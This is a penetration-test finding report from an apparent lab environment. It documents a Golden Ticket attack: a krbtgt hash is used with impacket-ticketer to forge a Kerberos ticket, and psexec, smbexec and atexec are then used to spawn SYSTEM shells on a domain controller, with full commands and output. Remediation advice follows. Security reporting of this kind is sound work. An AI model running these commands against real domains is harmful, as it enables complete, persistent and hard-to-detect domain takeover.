# Golden Ticket Attacks: Persistent Domain Access via Forged Kerberos TGT (Ticket Granting Ticket).

| Field | Details |
|-------|---------|
| **Severity** | 🔴 Critical |
| **Technique** | Golden Ticket |
| **Target** | `192.168.120.100` — `DC01-WINDOWSSERVER2019` |
| **Domain** | `lab.local` |
| **Prerequisite** | [DCSync Finding](DCSync.md) |

---

## Description

Using the krbtgt hash, supplied by a previous DCSync Attack, an attacker can create a "Golden Ticket" which will allow authentication as any user to connect to the server and gain full Domain access & control.

---

## Evidence

### Evidence A — Using the krbtgt hash a Golden Ticket can be created and exported for the attack.

```bash
impacket-ticketer -nthash b207f3a04617ddbb7249b71872abcf64 -domain lab.local -domain-sid S-1-5-21-3626527385-2561858057-3809917543 -groups 512,513,518,519,520 Administrator
```

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

### Evidence B — Using the Golden Ticket, an `NT AUTHORITY/SYSTEM` shell (System Shell) can be spawned in multiple ways.

```
impacket-psexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[*] Requesting shares on DC01-WindowsServer2019.lab.local.....
[*] Found writable share ADMIN$
[*] Uploading file cSnChsJA.exe
[*] Opening SVCManager on DC01-WindowsServer2019.lab.local.....
[*] Creating service YlzZ on DC01-WindowsServer2019.lab.local.....
[*] Starting service YlzZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32> whoami
nt authority\system
```

```
impacket-smbexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

```
impacket-atexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local whoami

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
[!] This will work ONLY on Windows >= Vista
[*] Creating task \zfrHgfdl
[*] Running task \zfrHgfdl
[*] Deleting task \zfrHgfdl
[*] Attempting to read ADMIN$\Temp\zfrHgfdl.tmp
nt authority\system
```

**Commands used:**
```bash
impacket-ticketer -nthash b207f3a04617ddbb7249b71872abcf64 -domain lab.local -domain-sid S-1-5-21-3626527385-2561858057-3809917543 -groups 512,513,518,519,520 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-smbexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local
impacket-psexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local
impacket-atexec -k -no-pass lab.local/Administrator@DC01-WindowsServer2019.lab.local whoami
```

---

## Impact

Golden Tickets allow attackers to maintain persistent access and control of a Domain. Golden Ticket attacks are more difficult to detect because there is no credential validation at all and relies on implicit cryptographic trust instead. This Golden Ticket allows attackers to maintain persistence on the Domain because there are no valid credentials needed -- just the krbtgt hash. There are no DC authorization logs to review, no failed authorizations at all, and no NTLM events to monitor for. Golden Tickets can be forged with 10 year lifespans to increase ease of persistence.

---

## Remediation

> Remediations are not listed in any specific order of severity unless otherwise listed.

1. **[CRITICAL] Rotate krbtgt passwords TWICE when compromises are found.** Rotating the krbtgt password once is NOT sufficient. (When the krbtgt password is changed once the previous entry is still valid and requires a second rotation to completely eliminate it.)
2. **Treat any DCSync findings as an immediate requirement to rotate the krbtgt password TWICE** as recommended above.
3. **Monitor Kerberos tickets for abnormally long lifespans** (10 Years on a Golden Ticket vs Default 10 Hours on a Kerberos ticket).
